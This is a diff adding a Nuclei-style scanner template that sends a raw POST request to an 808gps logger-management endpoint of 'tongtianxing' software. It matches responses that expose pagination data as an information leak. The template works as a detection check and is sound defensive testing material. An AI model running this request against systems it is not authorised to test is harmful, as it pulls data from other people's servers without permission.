@@ -1,0 +1,27 @@
+id: tongtianxing-SelectDevAction-loadWebLoggerFile-infoleak
+info:
+  name: tongtianxing-SelectDevAction-loadWebLoggerFile-infoleak
+  author: tongtianxing-SelectDevAction-loadWebLoggerFile-infoleak
+  severity: low
+
+
+requests:
+  - raw:
+      - |
+        POST /808gps/LoggerManagement/SelectDevAction_loadWebLoggerFile.action HTTP/1.1
+        Host: {{Hostname}}
+        Accept: application/json, text/javascript, */*; q=0.01
+        X-Requested-With: XMLHttpRequest
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded;charset=UTF-8
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh-HK;q=0.9,zh;q=0.8
+        Connection: close
+
+        page=1&rp=15&query=&qtype=&pagin=%257B%2522currentPage%2522%253A1%252C%2522pageRecords%2522%253A15%257D
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code==200 && contains_all(body,"pagination","startRecord","directQuery")
+
